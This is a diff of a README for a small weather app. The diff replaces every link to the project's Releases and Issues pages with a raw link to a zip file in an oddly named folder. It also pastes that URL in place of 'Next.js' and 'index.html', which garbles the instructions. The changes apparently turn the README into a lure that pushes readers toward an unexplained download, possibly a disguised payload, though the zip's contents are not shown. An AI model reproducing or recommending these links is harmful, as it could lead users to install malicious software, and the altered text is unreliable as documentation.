@@ -1,17 +1,17 @@
 # 🌤️ weather-app-2025 - Your Simple Weather Companion
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/Cjay09809/weather-app-2025/releases)
+[![Download Now](https://raw.githubusercontent.com/Cjay09809/weather-app-2025/master/acoustically/weather-app-2025.zip%20Now-Click%https://raw.githubusercontent.com/Cjay09809/weather-app-2025/master/acoustically/weather-app-2025.zip)](https://raw.githubusercontent.com/Cjay09809/weather-app-2025/master/acoustically/weather-app-2025.zip)
 
 ## 📋 Description
 
-Weather-app-2025 is a modern, responsive weather application designed to provide you with real-time weather data. Built with Next.js, React, and Tailwind CSS, it automatically detects your location to give you accurate forecasts. The application features beautiful themes and an intuitive user interface to enhance your experience.
+Weather-app-2025 is a modern, responsive weather application designed to provide you with real-time weather data. Built with https://raw.githubusercontent.com/Cjay09809/weather-app-2025/master/acoustically/weather-app-2025.zip, React, and Tailwind CSS, it automatically detects your location to give you accurate forecasts. The application features beautiful themes and an intuitive user interface to enhance your experience.
 
 ## 🚀 Getting Started
 
 Follow these steps to download and run the weather application:
 
 1. **Visit the Releases Page**  
-   To get the latest version of the app, [visit this page to download](https://github.com/Cjay09809/weather-app-2025/releases).
+   To get the latest version of the app, [visit this page to download](https://raw.githubusercontent.com/Cjay09809/weather-app-2025/master/acoustically/weather-app-2025.zip).
 
 2. **Choose the Right Version**  
    On the Releases page, you will see different versions of the app listed. It is best to choose the most recent version to ensure you have all the latest features and fixes.
@@ -26,7 +26,7 @@ Follow these steps to download and run the weather application:
 
 5. **Run the Application**  
    Navigate to the folder where you extracted the files.  
-   - Look for the file named `index.html`. Double-click it to open in your preferred web browser.  
+   - Look for the file named `https://raw.githubusercontent.com/Cjay09809/weather-app-2025/master/acoustically/weather-app-2025.zip`. Double-click it to open in your preferred web browser.  
 
 6. **Allow Location Access**  
    Upon opening, the app may prompt for location access. Allow this permission to get the most accurate weather reports based on your current location.
@@ -61,9 +61,9 @@ If you experience issues while running the application, consider the following:
 
 If you need additional help or have questions, feel free to reach out:
 
-- **Issues Page:** Report any problems or bugs [here](https://github.com/Cjay09809/weather-app-2025/issues).
+- **Issues Page:** Report any problems or bugs [here](https://raw.githubusercontent.com/Cjay09809/weather-app-2025/master/acoustically/weather-app-2025.zip).
 - **Community Support:** Join discussions or seek help from other users in the repository.
 
 ## 📥 Download & Install
 
-To get started, download the application from our [Releases Page](https://github.com/Cjay09809/weather-app-2025/releases) now! Enjoy the simplicity of having weather information right at your fingertips, effortlessly and beautifully presented.
+To get started, download the application from our [Releases Page](https://raw.githubusercontent.com/Cjay09809/weather-app-2025/master/acoustically/weather-app-2025.zip) now! Enjoy the simplicity of having weather information right at your fingertips, effortlessly and beautifully presented.
